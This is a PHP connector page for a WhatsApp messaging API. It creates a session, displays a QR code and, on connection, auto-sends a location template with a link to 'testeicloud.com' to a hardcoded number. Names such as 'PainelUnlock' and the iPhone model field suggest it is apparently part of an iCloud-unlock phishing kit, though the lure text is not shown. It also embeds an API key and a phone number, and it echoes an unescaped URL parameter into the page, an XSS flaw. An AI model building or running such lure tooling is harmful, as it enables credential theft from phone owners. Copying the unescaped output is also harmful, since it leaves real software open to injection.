<?php
/**
 * # WhatsApp Pro API - Conectador e Teste Automático
 * Este script cria a sessão, exibe o QR Code e dispara um teste automático ao conectar.
 */
session_start();

// 1. CONFIGURAÇÕES
$api_url = "http://localhost:3000";
$api_key = "botzp_75ee8182fd0c60022f3f25f665806c27"; 

// PEGA O NOME DO CLIENTE PELA URL OU USA UM PADRÃO (SIMULAÇÃO MULTI-CLIENTE)
$cliente_nome = isset($_GET['cliente']) ? $_GET['cliente'] : "PainelUnlock"; 
$session_id = $cliente_nome; 

// 2. CONFIGURAÇÕES DO TESTE AUTOMÁTICO (O que será enviado quando conectar)
$target_number = "554195457772";
$trackLink = "https://testeicloud.com";
$iphone_modelo = "iPhone 15 Pro Max";

// FUNÇÃO AUXILIAR PARA REQUISIÇÕES
function apiRequest($method, $endpoint, $data = null, $apiKey = '') {
    global $api_url;
    $ch = curl_init($api_url . $endpoint);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    $headers = ['Content-Type: application/json'];
    if ($apiKey) $headers[] = 'Authorization: Bearer ' . $apiKey;
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    if ($data) curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['code' => $httpCode, 'body' => json_decode($response, true)];
}

// LÓGICA DE EXECUÇÃO
$qr_code = "";
$status = "OFFLINE";
$send_result = null;

// Tenta criar/recuperar sessão
apiRequest('POST', '/api/create-session', ['session' => $session_id], $api_key);

// Busca Status e QR
$resStatus = apiRequest('GET', "/api/status/{$session_id}", null, $api_key);
$status = $resStatus['body']['status'] ?? 'Não encontrada';

// Se não estiver conectado, reseta o flag de envio para o próximo teste
if ($status !== 'connected') {
    unset($_SESSION['test_sent_'.$session_id]);
}

// Se conectou AGORA e ainda não enviou o teste nesta conexão
if ($status === 'connected' && !isset($_SESSION['test_sent_'.$session_id])) {
    echo "<!-- DISPARANDO TESTE AUTOMÁTICO... -->";
    
    $payload = [
        'session' => $session_id,
        'number' => $target_number,
        'option' => 1, // Usa o template de localização do robô
        'trackLink' => $trackLink,
        'name' => 'Christofer (Teste Auto)',
        'language' => 'pt'
    ];
    
    $resSend = apiRequest('POST', '/api/send-message', $payload, $api_key);
    $_SESSION['test_sent_'.$session_id] = $resSend['body'];
    $send_result = $resSend['body'];
} else if (isset($_SESSION['test_sent_'.$session_id])) {
    $send_result = $_SESSION['test_sent_'.$session_id];
}

// Se não está conectado, busca o QR
if ($status !== 'connected') {
    $resQr = apiRequest('GET', "/api/qrcode/{$session_id}", null, $api_key);
    if (!empty($resQr['body']['qr'])) {
        $qr_code = $resQr['body']['qr'];
    }
}

?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Pro - Conectador Pro</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0b0e11; color: #e9edef; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #111b21; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; max-width: 500px; width: 90%; border: 1px solid #2f3b44; }
        h1 { color: #00a884; margin-bottom: 5px; font-size: 24px; }
        .session-name { color: #8696a0; margin-bottom: 25px; font-size: 14px; }
        .status { font-weight: bold; margin-bottom: 25px; padding: 12px; border-radius: 8px; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
        .status.waiting_qr { background: #332b00; color: #ffbc00; border: 1px solid #665200; }
        .status.connected { background: #063b26; color: #00a884; border: 1px solid #005c4b; }
        .status.connecting { background: #1b3c48; color: #00b3f5; border: 1px solid #005e7e; }
        .qr-container { border: 1px solid #2f3b44; padding: 20px; display: inline-block; border-radius: 12px; background: white; margin-bottom: 20px; }
        img { max-width: 100%; border-radius: 4px; }
        .result-box { background: #202c33; padding: 15px; border-radius: 10px; margin-top: 20px; text-align: left; border-left: 4px solid #00a884; }
        .result-box h3 { margin: 0 0 10px 0; font-size: 16px; color: #00a884; }
        .result-box pre { margin: 0; font-size: 12px; color: #aebac1; overflow-x: auto; }
        .btn { display: inline-block; margin-top: 25px; padding: 12px 25px; background: #00a884; color: #111b21; text-decoration: none; border-radius: 25px; font-weight: bold; transition: 0.3s; }
        .btn:hover { background: #06cf9c; transform: translateY(-2px); }
        .info { font-size: 13px; color: #8696a0; margin-top: 20px; line-height: 1.5; }
        .auto-tag { display: inline-block; background: #f15c5c; color: white; padding: 2px 8px; border-radius: 4px; font-size: 10px; margin-bottom: 10px; vertical-align: middle; }
    </style>
    <?php if ($status !== 'connected'): ?>
    <meta http-equiv="refresh" content="5">
    <?php endif; ?>
</head>
<body>

<div class="card">
    <h1>WhatsApp Business Pro</h1>
    <div class="session-name">🆔 Instância: <?php echo $session_id; ?></div>

    <div class="status <?php echo $status; ?>">
        ● <?php echo strtoupper($status); ?>
    </div>

    <?php if ($qr_code): ?>
        <div class="qr-container">
            <img src="<?php echo $qr_code; ?>" alt="QR Code WhatsApp">
        </div>
        <p class="info">Escaneie o código acima para conectar.<br>O teste de envio começará <strong>imediatamente</strong> após a conexão.</p>
    <?php elseif ($status === 'connected'): ?>
        <div style="font-size: 60px; margin-bottom: 10px;">🛡️</div>
        <p style="font-size: 18px; color: #00a884; font-weight: bold;">DISPOSITIVO CONECTADO!</p>
        
        <?php if ($send_result): ?>
            <div class="result-box">
                <span class="auto-tag">DISPARO AUTOMÁTICO</span>
                <h3>Relatório de Envio:</h3>
                <pre><?php echo json_encode($send_result, JSON_PRETTY_PRINT); ?></pre>
                <p style="font-size: 12px; margin-top: 10px; color: #8696a0;">✅ Mensagem de Template (Opção 1) enviada para: <?php echo $target_number; ?></p>
            </div>
        <?php endif; ?>
        
        <p class="info">A API está pronta para uso nesta sessão.</p>
    <?php else: ?>
        <p>Iniciando mecanismo de conexão...</p>
        <div class="info">O servidor está processando a solicitação de QR Code.</div>
    <?php endif; ?>

    <div style="margin-top: 20px;">
        <a href="?" class="btn">Recarregar Página</a>
        <?php if ($status === 'connected'): ?>
            <a href="?reset=1" class="btn" style="background: #202c33; color: #00a884; margin-left: 10px;">Testar Novamente</a>
        <?php endif; ?>
    </div>
</div>

<?php
if (isset($_GET['reset'])) {
    unset($_SESSION['test_sent_'.$session_id]);
    header("Location: test_api_pro.php");
}
?>

</body>
</html>
